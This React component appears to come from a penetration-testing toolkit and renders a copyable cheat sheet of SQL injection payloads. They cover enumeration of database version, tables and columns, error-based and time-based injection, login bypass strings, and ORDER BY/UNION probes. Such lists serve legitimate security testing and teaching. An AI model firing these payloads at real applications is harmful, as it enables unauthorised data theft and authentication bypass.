import React from 'react';
import { Copy, Check } from 'lucide-react';
import { useClipboard } from '../../hooks/useClipboard';

export default function SQLTool() {
    const { copied, copy } = useClipboard();
    const [copiedId, setCopiedId] = React.useState<string>('');

    const handleCopy = (text: string, id: string) => {
        copy(text);
        setCopiedId(id);
        setTimeout(() => setCopiedId(''), 2000);
    };

    // Original HackTools payload data
    const DbColumnNumber = [
        {
            db_type: "MySQL/MSSQL/PGSQL",
            title: "'UNION SELECT NULL,NULL,NULL -- -",
        },
        {
            db_type: "ORACLE",
            title: "'UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
        },
        {
            db_type:
                "MYSQL/MSSQL/PGSQL/ORACLE  - (add +1 until you get an exception)",
            title: "' UNION ORDER BY 1 -- -",
        },
    ];

    const DbVersionEnumeration = [
        {
            db_type: "MySQL/MSSQL",
            title: `' UNION SELECT @@version -- -`,
        },
        {
            db_type: "Oracle",
            title: `' UNION SELECT banner from v$version -- -`,
        },
        {
            db_type: "Oracle(2nd method)",
            title: `' UNION SELECT version from v$instance -- -`,
        },
        {
            db_type: "Postgres",
            title: `' UNION SELECT version() -- -`,
        },
    ];

    const DbTableEnumeration = [
        {
            db_type: "MySQL/MSSQL/Postgres",
            title: `' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -`,
        },
        {
            db_type: "Oracle",
            title: `' UNION SELECT table_name,NULL FROM all_tables  -- -`,
        },
    ];

    const DbColumnEnumeration = [
        {
            db_type: "MySQL/MSSQL/Postgres",
            title: `' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name="X" -- -`,
        },
        {
            db_type: "Oracle",
            title: `' UNION SELECT column_name,NULL FROM all_tab_columns where table_name="X"  -- -`,
        },
    ];

    const DbColValueConcatenation = [
        {
            db_type: "MySQL/Postgres",
            title: `' UNION SELECT concat(col1,':',col2) from table_name limit 1 -- -`,
        },
        {
            db_type: "MySQL(2nd method)",
            title: `' UNION SELECT col1 ':' col2 from table_name limit 1 -- -`,
        },
        {
            db_type: "Oracle / Postgres",
            title: `' UNION SELECT select col1 ||':'||col2, null FROM  where table_name="X"  -- -`,
        },
        {
            db_type: "MSSQL",
            title: `' UNION SELECT col1+':'+col2,NULL from table_name limit 1 -- -`,
        },
    ];

    const DbConditionalErrors = [
        {
            db_type: "MySQL",
            title: `' UNION SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') -- -`,
        },
        {
            db_type: "Postgres",
            title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END -- -`,
        },
        {
            db_type: "Oracle",
            title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual -- -`,
        },
        {
            db_type: "MSSQL",
            title: `' UNION SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END -- -`,
        },
    ];

    const TimeBased = [
        { title: ",(select * from (select(sleep(10)))a)" },
        { title: "';WAITFOR DELAY '0:0:30'--" },
    ];

    const AuthBased = [
        { title: "or true--" },
        { title: '") or true--' },
        { title: "') or true--" },
        { title: "admin') or ('1'='1'--" },
        { title: "admin') or ('1'='1'#" },
        { title: "admin') or ('1'='1'/" },
    ];

    const OrderUnion = [
        { title: "1' ORDER BY 1--+" },
        { title: "1' ORDER BY 2--+" },
        { title: "1' ORDER BY 3--+" },
        { title: "1' ORDER BY 1,2--+" },
        { title: "1' ORDER BY 1,2,3--+" },
        { title: "1' GROUP BY 1,2,--+" },
        { title: "1' GROUP BY 1,2,3--+" },
        { title: "' GROUP BY columnnames having 1=1 --" },
        { title: "-1' UNION SELECT 1,2,3--+" },
        { title: "' UNION SELECT sum(columnname ) from tablename --" },
        { title: "-1 UNION SELECT 1 INTO @,@" },
        { title: "-1 UNION SELECT 1 INTO @,@,@" },
        { title: "1 AND (SELECT * FROM Users) = 1\t" },
        { title: "' AND MID(VERSION(),1,1) = '5';" },
        {
            title:
                "' and 1 in (select min(name) from sysobjects where x type = 'U' and name > '.') --",
        },
    ];

    const PayloadSection = ({ title, items }: { title: string; items: Array<{ db_type?: string; title: string }> }) => (
        <div className="mb-6">
            <h3 className="text-lg font-bold text-[#a2ff00] mb-3">{title}</h3>
            {items.map((item, i) => (
                <div key={i} className="mb-4">
                    {item.db_type && (
                        <div className="text-xs font-semibold text-gray-400 mb-1">{item.db_type}</div>
                    )}
                    <div className="htb-terminal-content flex items-start gap-2">
                        <pre className="flex-1 font-mono text-sm text-gray-200 whitespace-pre-wrap">{item.title}</pre>
                        <button
                            onClick={() => handleCopy(item.title, `${title}-${i}`)}
                            className="flex-shrink-0 p-2 rounded hover:bg-white/5 transition-colors"
                        >
                            {copiedId === `${title}-${i}` ? (
                                <Check size={16} className="text-[#a2ff00]" />
                            ) : (
                                <Copy size={16} className="text-gray-400" />
                            )}
                        </button>
                    </div>
                </div>
            ))}
        </div>
    );

    return (
        <div className="animate-fade-in">
            <div className="mb-6">
                <h2 className="text-2xl font-bold text-white mb-2">SQL Injection</h2>
                <p className="text-gray-400 text-sm leading-relaxed">
                    SQL injection (SQLi) is an application security weakness that allows
                    attackers to control an application's database letting them access or
                    delete data, change an application's data-driven behavior, and do
                    other undesirable things by tricking the application into sending
                    unexpected SQL commands.
                </p>
            </div>

            <div className="space-y-8">
                <PayloadSection title="Number of Columns" items={DbColumnNumber} />
                <PayloadSection title="Database Version Enumeration" items={DbVersionEnumeration} />
                <PayloadSection title="Table Name Enumeration" items={DbTableEnumeration} />
                <PayloadSection title="Column Name Enumeration" items={DbColumnEnumeration} />
                <PayloadSection title="Column Values Concatenation" items={DbColValueConcatenation} />
                <PayloadSection title="Conditional (Error Based)" items={DbConditionalErrors} />
                <PayloadSection title="Time-Based" items={TimeBased} />
                <PayloadSection title="Authentication Based Payloads" items={AuthBased} />
                <PayloadSection title="Order By and UNION Based Payloads" items={OrderUnion} />
            </div>
        </div>
    );
}
